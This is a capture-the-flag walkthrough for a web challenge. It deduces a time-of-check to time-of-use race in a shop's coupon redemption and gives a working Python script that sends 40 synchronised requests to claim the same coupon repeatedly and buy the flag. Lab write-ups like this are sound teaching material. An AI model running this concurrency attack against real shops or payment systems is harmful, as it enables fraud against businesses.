# Walkthrough: Race for the Flag (Black Box Mode)

**Category:** Web
**Difficulty:** Hard
**Vulnerability:** Race Condition (TOCTOU)

## 1. Reconnaissance
The player visits the website and sees a simple shop interface.
* **Goal:** Buy the "Flag", which costs **$1000**.
* **Current Balance:** $0.
* **Mechanism:** There is a form to claim a coupon code `FREE100`.

### Behavioral Analysis
1.  The player clicks "Claim Coupon".
2.  **Observation 1:** The page hangs for exactly **1 second** before reloading.
3.  **Observation 2:** The balance updates to $100.
4.  The player tries to claim the coupon again.
5.  **Observation 3:** The server responds instantly (no delay) with "Error: Coupon already used!".

### The Deduction
The 1-second delay during the *successful* claim, compared to the instant rejection on the *failed* claim, strongly suggests a backend logic like this:

1.  Check if used (Instant).
2.  **Processing/Wait (The 1s Delay).**
3.  Mark as used & Update Balance.

This delay indicates a "Time-of-Check to Time-of-Use" (TOCTOU) window. If the player can send a second request *during* that 1-second delay of the first request, the server might process both before marking the coupon as used.

## 2. Testing the Hypothesis
The player attempts to manually open two tabs and click "Claim" at the same time. This likely fails because human clicking is too slow to beat the database lock, or the browser queues the requests.

The player realizes they need a script or a tool (like Burp Suite Turbo Intruder) to send requests in parallel.

## 3. Developing the Exploit
The player writes a Python script to automate the attack.

**Requirements for the script:**
* **Multithreading:** To simulate multiple users hitting the button at once.
* **Synchronization:** All threads must fire at the exact same moment to fit inside the 1-second window.
* **Session Reuse:** The script must use the same session cookie so the money goes to the *same* account.

### Solution Script (`solve.py`)

```python
import requests
import threading
import sys

# Change this to the actual CTF URL
URL = "http://<TARGET_IP>:5000"
THREADS = 40

def solve():
    # 1. Start a Session
    s = requests.Session()
    s.get(URL) # Get the initial cookie
    print("[*] Session started. Resetting account to be safe...")
    s.get(f"{URL}/reset")

    # 2. Prepare the threads
    # We use a Barrier to make sure all 40 threads wait 
    # and then attack at the exact same microsecond.
    barrier = threading.Barrier(THREADS)
    
    def worker():
        try:
            barrier.wait() # Wait for everyone
            s.post(f"{URL}/claim", timeout=5)
        except:
            pass

    # 3. Launch the attack
    print(f"[*] Launching {THREADS} concurrent requests...")
    threads = []
    for _ in range(THREADS):
        t = threading.Thread(target=worker)
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    # 4. Check the damage
    resp = s.get(URL)
    if "Balance: <b>$" in resp.text:
        # Simple string parsing to find balance
        balance = int(resp.text.split("Balance: <b>$")[1].split("</b>")[0])
        print(f"[+] Attack complete. New Balance: ${balance}")
        
        if balance >= 1000:
            print("[+] Buying Flag...")
            print(s.post(f"{URL}/buy_flag").text)
        else:
            print("[-] Failed. Balance too low. Try again.")

if __name__ == "__main__":
    solve()
